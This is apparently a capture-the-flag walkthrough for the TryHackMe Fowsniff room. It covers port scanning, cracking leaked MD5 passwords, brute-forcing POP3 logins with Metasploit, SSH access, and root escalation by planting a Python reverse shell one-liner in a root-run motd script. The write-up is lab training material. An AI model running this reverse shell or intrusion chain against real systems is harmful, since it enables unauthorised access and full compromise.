Room: [Fowsniff CTF](https://tryhackme.com/room/ctf)

Difficulty: Easy

Overview: On-going project

------------------------------------------------------------------------------------------------------------------------------------------------------------------

We will start by enumerating all open ports on the remote system and to do so we can use “nmap”:

```
nmap -sV -sC -p- fowsniff.thm -oN nmap.txt

-sV         → Probe open ports to determine service
-sC         → Scan using the default set of scripts
-p-          → Scan all ports
fowsniff.thm  → ip address of the room (added the ip to /etc/hosts and named it)
-oN         → Save the ouput of the scan in a file
```

![image](https://user-images.githubusercontent.com/76821053/166565008-389610f8-322e-4664-863a-c1e9ec04125c.png)

There are four open ports on the system:

22 → OpenSSH 7.2p2 Ubuntu

80 → Apache httpd 2.4.18

110 → Dovecot pop3d

143 → Dovecot imapd

Since there is an apache webserver running in the system we can use "Gobuster" to search for hidden directories or files in http servers:

![image](https://user-images.githubusercontent.com/76821053/166566478-31c90dd0-f9fa-49b7-ad12-2373e6c3f384.png)

When analysing the results "Gobuster" found a security.txt file that we can access.

![image](https://user-images.githubusercontent.com/76821053/166566690-190a443c-07cf-4192-ad14-1106a39b6ef5.png)

This server was hacked by BigN1nj4! who left a teaser on the website.

Now, the room gave us a hint to look for information using google. A little later i found that the hacker leaked information on [PASTEBIN](https://pastebin.com/NrAqVeeX).

![image](https://user-images.githubusercontent.com/76821053/166566743-734f9fb9-bd15-4b67-b918-d7f297bac6ed.png)

He leaked email and their respective passwords from their databases. The hashes are encrypted in MD5 and to decrypt them we can use sites like [hashkiller](https://hashkiller.io/listmanager) or [hashes.com](hashes.com/en/decrypt/hash).

![image](https://user-images.githubusercontent.com/76821053/166566776-080788b0-f88a-4eae-909f-708dbb0381ec.png)

After decrypting all MD5 hashes i have created two text files, one with the name of the users found and another with the decrypted passwords.

The purpose is to try to brute force the pop3 login service mail with the dictionaries that we have just created from the two text files.

To find a valid login we can use diferent tools but in this case we will use "metasploit".

```
msfconsole

search pop3  - To search for pop3 related content

use auxiliary/scanner/pop3/pop3_login   - To select the option we want to use
```

![image](https://user-images.githubusercontent.com/76821053/166566786-731828e6-2214-475f-bbf0-2250f6651b5b.png)

```
options  -  To list the module options that we need to set to do our brute force 
```
We have to set PASS_FILE and USER_FILE to the path of our text files and set the RHOSTS to the ip we want to target.

![image](https://user-images.githubusercontent.com/76821053/166566802-9c2d140a-4738-43ac-b074-b1961c60ea39.png)

To run this module just hit run

```
run
```

![image](https://user-images.githubusercontent.com/76821053/166566824-ba1078f4-2aa8-42fd-9d09-88b61cd8b0df.png)

Metaspoit attack found a valid user and respective password. With these credentials we have accessed the pop3 email service hosted at port 110.

To access the email service we can use "Telnet". In this website you can find information "Telnet" about commands https://www.shellhacks.com/retrieve-email-pop3-server-command-line/

```
telnet 10.10.125.75 110

USER seina 

PASS *******

LIST     - Lists all messages

RETR 1   - Retrieve first message

RETR 2   - Retrives second message
```

![image](https://user-images.githubusercontent.com/76821053/166566847-a75b12cc-aff6-426a-9a04-a431d03db427.png)

In the first message there is ssh credentials. They belong to user "backsteen".

With them we can connect to the target machine through ssh:

```
ssh backsteen@fowsniff.thm
```

![image](https://user-images.githubusercontent.com/76821053/166566877-f6437936-4876-428f-b5bd-d136916aa6cf.png)

When enumerating the system i searched for any files that can be run by that group users:

```
find / -group users -type f -exec ls -la {} 2>/dev/null \;

```

![image](https://user-images.githubusercontent.com/76821053/166566901-07448446-f980-4184-ba6a-20aae12e5dd0.png)

Found that users group have read/write permissions of a bash script called cube.sh.

![image](https://user-images.githubusercontent.com/76821053/166566918-dfa97f58-bc9f-43d9-81de-23cb4398adbc.png)

After reading the contents of cube.sh we can recognize that this prints the motd (message of the day) that we receive after connecting through ssh.

If we check the directory /etc/update-motd.d/ and look into the executables, the file “00-header” runs the cube.sh script with root permissions.

![image](https://user-images.githubusercontent.com/76821053/166566946-76373e54-79b5-48c1-bd7b-3e12788de657.png)

This is our way to get a privilege escalation in this machine. Since we have group permissions to write cube.sh script we can try and get a reverse shell by including a python3 reverse shell payload.

We need to edit the cube.sh file with "nano" or "vim" and add the python reverse shell.

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Pay attention to the syntax because you need to make a little change. Your ip will be between comas.

![image](https://user-images.githubusercontent.com/76821053/166566976-9d18124e-a0e7-41d2-b4c4-a40a231f04a8.png)

We need to setup a netcat listener and restart the ssh connection to trigger the motd welcome message and it will run our reverse shell.

![image](https://user-images.githubusercontent.com/76821053/166567250-877a7eed-83b5-4f6a-b846-c0b351b966a6.png)

Success we are now root!!

Just for proof of concept we can print the root flag!

![image](https://user-images.githubusercontent.com/76821053/166567045-7163c720-eba6-496b-bfaf-8e3d8667c762.png)









